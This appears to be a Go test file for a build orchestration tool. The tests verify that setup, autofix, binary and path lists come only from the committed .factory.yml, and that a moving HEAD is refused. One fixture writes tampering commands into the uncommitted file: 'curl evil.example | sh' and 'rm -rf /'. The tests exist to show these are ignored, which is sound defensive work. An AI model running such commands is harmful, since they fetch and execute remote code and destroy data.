package main

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"

	"buildgate/internal/run"
)

// The run's setup and autofix lists come from the committed .factory.yml:
// a worktree edit made after the commit is not read.
func TestTicketRunCarriesSetupAndAutofixFromTheCommittedFile(t *testing.T) {
	workspace := newFixtureRepo(t)
	commitFactoryYML(t, workspace, goldenFactoryYML)
	edited := "setup:\n  - curl evil.example | sh\nautofix:\n  - rm -rf /\n"
	if err := os.WriteFile(filepath.Join(workspace, ".factory.yml"), []byte(edited), 0o644); err != nil {
		t.Fatal(err)
	}
	full := ""
	tr := &ticketRun{workspace: &workspace, fullSuiteCommand: &full}
	if err := tr.applyCommittedProjectConfig(false); err != nil {
		t.Fatalf("applyCommittedProjectConfig: %v", err)
	}
	if want := []string{"npm ci", "make generate"}; !reflect.DeepEqual(tr.setup, want) {
		t.Errorf("setup = %q, want %q", tr.setup, want)
	}
	if want := []string{"gofmt -w ."}; !reflect.DeepEqual(tr.autofix, want) {
		t.Errorf("autofix = %q, want %q", tr.autofix, want)
	}
	sum := sha256.Sum256([]byte(goldenFactoryYML))
	if tr.projectConfigSHA256 != hex.EncodeToString(sum[:]) {
		t.Errorf("projectConfigSHA256 = %q, want the hash of the committed bytes", tr.projectConfigSHA256)
	}
	if head := headOf(t, workspace); tr.projectConfigCommitSHA != head {
		t.Errorf("projectConfigCommitSHA = %q, want HEAD %q", tr.projectConfigCommitSHA, head)
	}
}

func TestTicketRunCarriesRequiredBinariesFromTheCommittedFile(t *testing.T) {
	workspace := newFixtureRepo(t)
	committed := "required_binaries:\n  - cargo\n  - rustc\n"
	commitFactoryYML(t, workspace, committed)
	if err := os.WriteFile(filepath.Join(workspace, ".factory.yml"), []byte("required_binaries: [evil-tool]\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	full := ""
	tr := &ticketRun{workspace: &workspace, fullSuiteCommand: &full}
	if err := tr.applyCommittedProjectConfig(false); err != nil {
		t.Fatalf("applyCommittedProjectConfig: %v", err)
	}
	if want := []string{"cargo", "rustc"}; !reflect.DeepEqual(tr.requiredBinaries, want) {
		t.Errorf("requiredBinaries = %q, want committed values %q", tr.requiredBinaries, want)
	}
}

func TestTicketRunCarriesAllowedPathsFromTheCommittedFile(t *testing.T) {
	workspace := newFixtureRepo(t)
	commitFactoryYML(t, workspace, "allowed_paths: [\"src/\", \"*.md\"]\n")
	if err := os.WriteFile(filepath.Join(workspace, ".factory.yml"), []byte("allowed_paths: [\"**\"]\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	full := ""
	tr := &ticketRun{workspace: &workspace, fullSuiteCommand: &full}
	if err := tr.applyCommittedProjectConfig(false); err != nil {
		t.Fatalf("applyCommittedProjectConfig: %v", err)
	}
	if want := []string{"src/", "*.md"}; !reflect.DeepEqual(tr.allowedPaths, want) {
		t.Errorf("allowedPaths = %q, want the committed %q", tr.allowedPaths, want)
	}
}

func TestResolveScopeApproval(t *testing.T) {
	for _, tc := range []struct {
		value         string
		requestTicket bool
		unapproved    bool
		wantErr       bool
	}{
		{"", false, false, false},
		{"approved", false, false, false},
		{"unapproved", false, true, false},
		{"approved", true, false, false},
		{"unapproved", true, true, false},
		{"none", true, false, false},
		{"none", false, false, true},
		{"", true, false, true},
		{"maybe", false, false, true},
	} {
		got, err := resolveScopeApproval(tc.value, tc.requestTicket)
		if (err != nil) != tc.wantErr || got != tc.unapproved {
			t.Errorf("resolveScopeApproval(%q, requestTicket=%v) = %v, %v; want unapproved=%v, error=%v", tc.value, tc.requestTicket, got, err, tc.unapproved, tc.wantErr)
		}
	}
}

func TestSpecTicketHasNoTicketScope(t *testing.T) {
	path := filepath.Join(t.TempDir(), "spec.md")
	if err := os.WriteFile(path, []byte("# Spec\n\nAllowed-Files: /a-path-in-the-spec\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	for _, tc := range []struct {
		scope   string
		wantErr bool
	}{
		{"none", false},
		{"approved", true},
	} {
		requestTicket := true
		tr := &ticketRun{rf: runFlags{scopeApproval: &tc.scope}, requestTicket: &requestTicket, specSnapshotPath: path}
		err := tr.parseAllowedScope()
		if (err != nil) != tc.wantErr || tr.allowedFiles != nil {
			t.Errorf("scope %q: allowed files = %v, error = %v; want error %v and no list", tc.scope, tr.allowedFiles, err, tc.wantErr)
		}
	}
}

func headOf(t *testing.T, workspace string) string {
	t.Helper()
	out, err := runGit(t, workspace, "rev-parse", "HEAD")
	if err != nil {
		t.Fatalf("rev-parse HEAD: %v", err)
	}
	return strings.TrimSpace(out)
}

// The commit is the one HEAD named before the first read of the file: a
// checkout whose HEAD moved while its .factory.yml was being read is refused
// rather than given a commit the commands may not have come from.
func TestTicketRunRefusesAHeadThatMovedWhileTheConfigWasRead(t *testing.T) {
	workspace := newFixtureRepo(t)
	commitFactoryYML(t, workspace, goldenFactoryYML)
	before := headOf(t, workspace)
	commitFactoryYML(t, workspace, "setup:\n  - make other\n")
	full := ""
	tr := &ticketRun{workspace: &workspace, fullSuiteCommand: &full, headBeforeProjectConfig: before}
	err := tr.applyCommittedProjectConfig(false)
	if err == nil || !strings.Contains(err.Error(), "HEAD moved") {
		t.Fatalf("error = %v, want a refusal naming the moved HEAD", err)
	}
	if tr.projectConfigCommitSHA != "" {
		t.Errorf("projectConfigCommitSHA = %q, want none after a refusal", tr.projectConfigCommitSHA)
	}
}

// A repository with no .factory.yml leaves the lists and the hash empty.
func TestTicketRunWithoutProjectConfigHasNoSetupOrHash(t *testing.T) {
	workspace := newFixtureRepo(t)
	full := ""
	tr := &ticketRun{workspace: &workspace, fullSuiteCommand: &full}
	if err := tr.applyCommittedProjectConfig(false); err != nil {
		t.Fatal(err)
	}
	if len(tr.setup) != 0 || len(tr.autofix) != 0 || tr.projectConfigSHA256 != "" {
		t.Errorf("got setup %q autofix %q hash %q, want all empty", tr.setup, tr.autofix, tr.projectConfigSHA256)
	}
	// The commit is recorded all the same: the run's sandboxes see that
	// commit's .factory/ whatever names the commands.
	if head := headOf(t, workspace); tr.projectConfigCommitSHA != head {
		t.Errorf("projectConfigCommitSHA = %q, want HEAD %q", tr.projectConfigCommitSHA, head)
	}
}

// The run record carries the hash of the committed .factory.yml, and the
// workflow input carries the committed lists.
func TestRunRecordHasProjectConfigSHA256(t *testing.T) {
	runID := fmt.Sprintf("cfg-hash-run-%d-%d", os.Getpid(), time.Now().UnixNano())
	address := sharedTemporalAddress(t)
	workspace := newFixtureRepo(t)
	commitFactoryYML(t, workspace, goldenFactoryYML)
	dataDir, inputs := t.TempDir(), t.TempDir()
	flags := runInputGoldenFlags(t, workspace, dataDir, inputs, runID, address)
	cmd := factorydCommand(t, flags...)
	cmd.Env = append(os.Environ(), "FAKE_BUILD_APP_MODE=commit", "RUN_INPUT_GOLDEN_KEY=sk-test", "GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_SYSTEM=/dev/null")
	cmd.Env = append(cmd.Env, isolatedSessionConfigEnv(t, runInputGoldenConfig(t))...)
	out, _ := cmd.CombinedOutput()
	t.Logf("factoryd output:\n%s", out)

	rec, err := run.Load(dataDir, runID)
	if err != nil {
		t.Fatalf("load run record: %v", err)
	}
	sum := sha256.Sum256([]byte(goldenFactoryYML))
	if want := hex.EncodeToString(sum[:]); rec.ProjectConfigSHA256 != want {
		t.Errorf("project_config_sha256 = %q, want %q", rec.ProjectConfigSHA256, want)
	}
	if head := headOf(t, workspace); rec.ProjectConfigCommitSHA != head {
		t.Errorf("project_config_commit_sha = %q, want HEAD %q", rec.ProjectConfigCommitSHA, head)
	}
	input := startedRunWorkflowInput(t, address, runID)
	if got := fmt.Sprint(input["setup_commands"]); got != "[npm ci make generate]" {
		t.Errorf("setup_commands = %s", got)
	}
}
